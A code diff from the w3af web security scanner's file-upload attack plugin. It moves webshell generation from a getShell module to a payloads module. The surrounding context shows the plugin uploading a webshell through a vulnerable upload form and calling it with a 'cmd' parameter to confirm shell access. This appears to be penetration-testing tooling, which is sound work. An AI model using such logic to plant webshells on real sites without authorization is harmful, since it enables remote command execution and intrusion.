@@ -20,9 +20,9 @@ Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 
 '''
 
-
 from core.data.fuzzer.fuzzer import createRandAlNum
 import core.controllers.outputManager as om
+
 # options
 from core.data.options.option import option
 from core.data.options.optionList import optionList
@@ -34,10 +34,12 @@ from core.data.kb.shell import shell as shell
 
 import core.data.parsers.urlParser as urlParser
 from core.controllers.w3afException import w3afException
-import plugins.attack.webshells.getShell as getShell
+import plugins.attack.payloads.payloads as payloads
+
 import os
 import os.path
 import urllib
+
 
 class fileUploadShell(baseAttackPlugin):
     '''
@@ -132,7 +134,7 @@ class fileUploadShell(baseAttackPlugin):
         response = http_method( vuln_obj.getURL() ,  exploit_dc )
         
         # Call the uploaded script with an empty value in cmd parameter
-        # this will return the getShell.SHELL_IDENTIFIER if success
+        # this will return the payloads.SHELL_IDENTIFIER if success
         dst = vuln_obj['fileDest']
         self._exploit = urlParser.getDomainPath( dst ) + self._file_name + '?cmd='
         response = self._urlOpener.GET( self._exploit )
@@ -141,7 +143,7 @@ class fileUploadShell(baseAttackPlugin):
         file_handler.close()
         os.remove( self._path_name )
         
-        if getShell.SHELL_IDENTIFIER in response.getBody():
+        if payloads.SHELL_IDENTIFIER in response.getBody():
             return True
         else:
             return False
@@ -158,7 +160,7 @@ class fileUploadShell(baseAttackPlugin):
         except:
             raise w3afException('Could not create '+ dir + ' directory.')
         
-        file_content, real_extension = getShell.getShell( extension, forceExtension=True )[0]
+        file_content, real_extension = payloads.get_webshells( extension, forceExtension=True )[0]
         if extension == '':
             extension = real_extension
             
